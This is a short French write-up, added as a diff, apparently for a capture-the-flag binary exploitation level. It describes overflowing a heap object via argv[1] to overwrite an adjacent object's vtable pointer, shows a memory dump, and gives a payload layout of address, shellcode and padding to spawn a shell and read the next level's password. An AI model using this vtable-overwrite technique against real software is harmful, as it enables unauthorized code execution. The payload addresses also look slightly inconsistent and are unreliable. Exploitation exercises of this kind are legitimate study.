@@ -1,0 +1,29 @@
+On va exploiter les vtable.
+
+On se rend compte que vers la fin du programme on a une fonction de l'objet créé (potentiellement un nombre) qui est appelée.
+Il s'avere que les objets sont les uns à la suite des autres dans la mémoire.
+argv[1] est copié dans le 1er objet, on va s'en servir pour override l'adresse de la fameuse mméthode.
+La mémoire ressemble à ceci:
+
+0x804a008:	0x08048848	0x31313131	0x00313131	0x00000000 ---
+0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000  |
+0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000  |
+0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000  | Objet 1
+0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000  |
+0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000  |
+0x804a068:	0x00000000	0x00000000	0x00000005	0x00000071 ---
+0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000 ---
+0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000  |
+0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000  |
+0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000  | Objet 2
+0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000  |
+0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000  |
+0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21 ---
+
+Tous les 0x31 sont des 1 dans argv[1].
+On va réécrire dans 0x804a078 une adresse dans ces 0x31, par exemple 0x804a00c, à laquelle on aura l'adresse du début de la fonction à éxécuter (ici notre shellcode).
+On va donc envoyer un code de cette forme:
+
+0x804a010 + shellcode + padding + 0x804a00d
+
+Ce qui va nous permettre d'ouvrir un shell et d'avoir le mot de passe de bonus0.
